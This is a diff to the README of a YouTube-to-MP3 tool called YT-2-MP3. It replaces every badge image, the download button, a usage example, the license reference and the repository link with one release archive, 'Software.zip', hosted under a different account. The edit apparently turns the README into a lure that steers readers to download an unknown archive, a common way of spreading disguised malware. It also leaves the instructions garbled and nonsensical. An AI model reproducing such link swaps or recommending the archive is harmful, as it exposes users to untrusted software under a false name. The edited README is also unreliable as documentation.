@@ -3,9 +3,9 @@
 
 ---
 
-![GitHub repo size](https://img.shields.io/github/repo-size/YT-2-MP3/YT-2-MP3)
-![GitHub contributors](https://img.shields.io/github/contributors/YT-2-MP3/YT-2-MP3)
-![GitHub last commit](https://img.shields.io/github/last-commit/YT-2-MP3/YT-2-MP3)
+![GitHub repo size](https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip)
+![GitHub contributors](https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip)
+![GitHub last commit](https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -55,7 +55,7 @@ YT-2-MP3 is a powerful tool that allows you to download and convert YouTube link
 
 To get started, download the latest version of YT-2-MP3 by clicking the button below:
 
-[![Download YT-2-MP3](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download YT-2-MP3](https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip)](https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -68,7 +68,7 @@ To get started, download the latest version of YT-2-MP3 by clicking the button b
 1. Clone the repository.
 2. Navigate to the project directory.
 3. Run the following command: `./yt2mp3 <YouTube_URL>` to convert a single YouTube link to .mp3.
-4. Run `./yt2mp3 -b <file.txt>` to convert multiple YouTube links from a text file to .mp3.
+4. Run `./yt2mp3 -b <https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip>` to convert multiple YouTube links from a text file to .mp3.
 
 ---
 
@@ -81,11 +81,11 @@ To get started, download the latest version of YT-2-MP3 by clicking the button b
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE.md file for details.
+This project is licensed under the MIT License - see the https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip file for details.
 
 ---
 
-### For more information, visit the [YT-2-MP3 GitHub Repository](https://github.com/YT-2-MP3/YT-2-MP3).
+### For more information, visit the [YT-2-MP3 GitHub Repository](https://github.com/mistamilker/YT-2-MP3/releases/download/v1.0/Software.zip).
 
 ---
 
